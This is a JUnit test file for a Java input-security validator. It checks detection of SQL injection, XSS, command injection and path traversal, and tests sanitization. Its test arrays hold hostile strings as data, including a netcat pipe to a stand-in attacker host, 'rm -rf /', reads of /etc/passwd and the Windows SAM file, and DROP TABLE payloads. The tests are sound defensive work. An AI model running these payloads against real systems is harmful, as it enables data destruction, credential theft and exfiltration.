package com.developer.validation;

import com.developer.dto.ValidationResult;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Unit tests for SecurityInputValidator
 */
class SecurityInputValidatorTest {
    
    private SecurityInputValidator validator;
    private SanitizationEngine sanitizationEngine;
    private InjectionDetector injectionDetector;
    
    @BeforeEach
    void setUp() {
        sanitizationEngine = new SanitizationEngine();
        injectionDetector = new InjectionDetector();
        validator = new SecurityInputValidator(sanitizationEngine, injectionDetector);
    }
    
    @Test
    @DisplayName("Should pass validation for safe input")
    void shouldPassValidationForSafeInput() {
        // Given
        String safeInput = "Hello World 123";
        
        // When
        ValidationResult result = validator.validate(safeInput);
        
        // Then
        assertTrue(result.isValid());
        assertTrue(result.getErrors().isEmpty());
    }
    
    @Test
    @DisplayName("Should detect SQL injection attempts")
    void shouldDetectSqlInjectionAttempts() {
        // Given
        String[] sqlInjectionInputs = {
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords",
            "admin'--",
            "1' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        };
        
        // When & Then
        for (String input : sqlInjectionInputs) {
            ValidationResult result = validator.validate(input);
            assertFalse(result.isValid(), "Should detect SQL injection in: " + input);
            assertFalse(result.getErrors().isEmpty());
        }
    }
    
    @Test
    @DisplayName("Should detect XSS attempts")
    void shouldDetectXssAttempts() {
        // Given
        String[] xssInputs = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<div onclick=\"alert('XSS')\">Click me</div>",
            "data:text/html,<script>alert('XSS')</script>"
        };
        
        // When & Then
        for (String input : xssInputs) {
            ValidationResult result = validator.validate(input);
            assertFalse(result.isValid(), "Should detect XSS in: " + input);
            assertFalse(result.getErrors().isEmpty());
        }
    }
    
    @Test
    @DisplayName("Should detect command injection attempts")
    void shouldDetectCommandInjectionAttempts() {
        // Given
        String[] commandInjectionInputs = {
            "test; rm -rf /",
            "file.txt && cat /etc/passwd",
            "input | nc attacker.com 4444",
            "$(whoami)",
            "`id`",
            "test & powershell -c \"Get-Process\""
        };
        
        // When & Then
        for (String input : commandInjectionInputs) {
            ValidationResult result = validator.validate(input);
            assertFalse(result.isValid(), "Should detect command injection in: " + input);
            assertFalse(result.getErrors().isEmpty());
        }
    }
    
    @Test
    @DisplayName("Should detect path traversal attempts")
    void shouldDetectPathTraversalAttempts() {
        // Given
        String[] pathTraversalInputs = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/var/www/../../../etc/passwd",
            "....//....//....//etc/passwd"
        };
        
        // When & Then
        for (String input : pathTraversalInputs) {
            ValidationResult result = validator.validate(input);
            assertFalse(result.isValid(), "Should detect path traversal in: " + input);
            assertFalse(result.getErrors().isEmpty());
        }
    }
    
    @Test
    @DisplayName("Should sanitize dangerous input")
    void shouldSanitizeDangerousInput() {
        // Given - test with script tags (should be removed completely)
        String scriptInput = "<script>alert('XSS')</script>";
        String htmlInput = "<div>Hello & goodbye</div>";
        
        // When
        String sanitizedScript = validator.sanitize(scriptInput);
        String sanitizedHtml = validator.sanitize(htmlInput);
        
        // Then
        assertNotEquals(scriptInput, sanitizedScript);
        assertFalse(sanitizedScript.contains("<script>"));
        // The new sanitization engine removes script tags completely for better security
        assertTrue(sanitizedScript.isEmpty() || !sanitizedScript.contains("script"));
        
        // HTML should be encoded
        assertNotEquals(htmlInput, sanitizedHtml);
        assertTrue(sanitizedHtml.contains("&lt;") || sanitizedHtml.contains("&amp;"));
    }
    
    @Test
    @DisplayName("Should handle null and empty input safely")
    void shouldHandleNullAndEmptyInputSafely() {
        // Test null input
        ValidationResult nullResult = validator.validate(null);
        assertTrue(nullResult.isValid());
        
        // Test empty input
        ValidationResult emptyResult = validator.validate("");
        assertTrue(emptyResult.isValid());
        
        // Test whitespace input
        ValidationResult whitespaceResult = validator.validate("   ");
        assertTrue(whitespaceResult.isValid());
    }
    
    @Test
    @DisplayName("Should detect injection attempts correctly")
    void shouldDetectInjectionAttemptsCorrectly() {
        // Given
        String safeInput = "normal user input";
        String dangerousInput = "'; DROP TABLE users; --";
        
        // When & Then
        assertFalse(validator.detectInjectionAttempt(safeInput));
        assertTrue(validator.detectInjectionAttempt(dangerousInput));
    }
    
    @Test
    @DisplayName("Should provide validator name")
    void shouldProvideValidatorName() {
        // When
        String name = validator.getValidatorName();
        
        // Then
        assertEquals("SecurityInputValidator", name);
    }
    
    @Test
    @DisplayName("Should sanitize SQL comment patterns")
    void shouldSanitizeSqlCommentPatterns() {
        // Given
        String inputWithComments = "SELECT * FROM users -- WHERE id = 1";
        
        // When
        String sanitized = validator.sanitize(inputWithComments);
        
        // Then
        assertFalse(sanitized.contains("--"));
    }
    
    @Test
    @DisplayName("Should remove null bytes")
    void shouldRemoveNullBytes() {
        // Given
        String inputWithNullBytes = "test\0input";
        
        // When
        String sanitized = validator.sanitize(inputWithNullBytes);
        
        // Then
        assertFalse(sanitized.contains("\0"));
        assertEquals("testinput", sanitized);
    }
}